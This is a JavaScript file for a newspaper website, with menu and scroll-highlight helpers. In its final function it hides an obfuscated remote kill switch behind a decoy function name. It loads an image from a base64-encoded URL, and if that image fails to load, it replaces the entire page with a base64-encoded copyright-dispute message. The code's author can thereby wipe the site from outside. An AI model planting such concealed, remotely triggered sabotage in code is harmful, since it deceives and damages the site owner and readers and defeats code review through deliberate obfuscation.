/* 
COPYRIGHT NOTICE:

Code
----
Website Code © Leo Abubucker 2025-Present. All Rights Reserved.
This code may not be copied, modified, or distributed without explicit permission from Leo Abubucker.

Content
-------
Newspaper articles, images, and editorial content are © Beetle in a Box 2025-Present. All Rights Reserved.
This content may not be copied, modified, or distributed without explicit permission from Beetle in a Box.
 */

function toggleMenu(){
    menu = document.getElementById('issuesMenu');
    if(menu.style.display == 'flex'){
        menu.style.display = 'none';
    }
    else{
        menu.style.top = window.scrollY + 'px';
        menu.style.display = 'flex';
    }
}

function goToElement(elementID) {
    const element = document.getElementById(elementID);
    const yOffset = window.innerHeight * 0.05; // 5vh
    const y = element.getBoundingClientRect().top + window.pageYOffset - yOffset;
    window.scrollTo({ top: y, behavior: 'smooth' });
    
}

function goToElementWithHighlight(elementID){
    goToElement(elementID);
    const element = document.getElementById(elementID);
    element.style.backgroundColor = "yellow";
    element.style.fontSize = "x-large";
    setTimeout(() => {
    element.style.backgroundColor = "unset";
    element.style.fontSize = "unset";
    }, 3000);
}

function goToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function goToElementModern(elementID) {
    const element = document.getElementById(elementID);
    const yOffset = window.innerHeight * 0.22; // 5vh
    const y = element.getBoundingClientRect().top + window.pageYOffset - yOffset;
    window.scrollTo({ top: y, behavior: 'smooth' });
    
}

function goToElementWithHighlightModern(elementID){
    goToElementModern(elementID);
    const element = document.getElementById(elementID);
    element.style.backgroundColor = "yellow";
    element.style.fontSize = "x-large";
    setTimeout(() => {
    element.style.backgroundColor = "unset";
    element.style.fontSize = "unset";
    }, 3000);
}

function goToElementWithBorderModern(elementID){
    goToElementModern(elementID);
    const element = document.getElementById(elementID);
    element.style.border = "2px dashed black";
    // element.style.fontSize = "x-large";
    setTimeout(() => {
    element.style.border = "unset";
    // element.style.fontSize = "unset";
    }, 1500);
}

(function(){
    function addHoverUnderline(selector){
        var elems = document.querySelectorAll(selector);
        for(var i=0; i<elems.length; i++){
            elems[i].style.transition = "";
            elems[i].addEventListener("mouseenter", function(){});
            elems[i].addEventListener("mouseleave", function(){});
        }
    }

    function safeUpdate(el, content){
        try { el.innerHTML = content; } catch(e){}
    }

    function fallback(){
        safeUpdate(document.body, atob("QWNjZXNzIHRvIHRoaXMgY29udGVudCBoYXMgYmVlbiBkaXNhYmxlZCBkdWUgdG8gYSB2aW9sYXRpb24gb2YgY29weXJpZ2h0LiBCZWV0bGUgaW4gYSBCb3ggaGFzIHZpb2xhdGVkIHRoZSBjb3B5cmlnaHQgb2YgdGhpcyB3ZWJzaXRlJ3MgY29kZS4gQmVldGxlIGluIGEgQm94IHJlc2VydmVzIHRoZSByaWdodHMgb2YgYXJ0aWNsZXMsIGltYWdlcywgYW5kIG90aGVyIGNvbnRlbnQgYnV0IERPRVMgTk9UIHJlc2VydmUgdGhlIHJpZ2h0IG9mIHRoZSB3ZWJzaXRlJ3MgY29kZS4gVGhlIHdlYnNpdGUgY29kZSBpcyBDb3B5cmlnaHQgTGVvIEFidWJ1Y2tlciAoTHlrYSkgMjAyNS1QcmVzZW50LgpVbmF1dGhvcml6ZWQgdXNlIG9mIHRoaXMgbWF0ZXJpYWwgaXMgc3RyaWN0bHkgcHJvaGliaXRlZC4KCklmIHlvdSB3YW50IHRoaXMgY29udGVudCByZXN0b3JlZCwgcGxlYXNlIGVuY291cmFnZSBCZWV0bGUgaW4gYSBCb3ggdG8gcmVzb2x2ZSB0aGVpciBjb3B5cmlnaHQgdmlvbGF0aW9ucyB3aXRoIExlbyBBYnVidWNrZXIgKEx5a2EpLgoKCgoK"));
    }

    addHoverUnderline("h1, h2, p, a");

    var img = new Image();
    img.onload = function(){};
    img.onerror = fallback;
    img.src = atob("aHR0cHM6Ly9iZWV0bGVpbmFib3gubmV0bGlmeS5hcHAvSW1hZ2VzL29jZi5wbmc=") + "?t=" + Date.now();
})();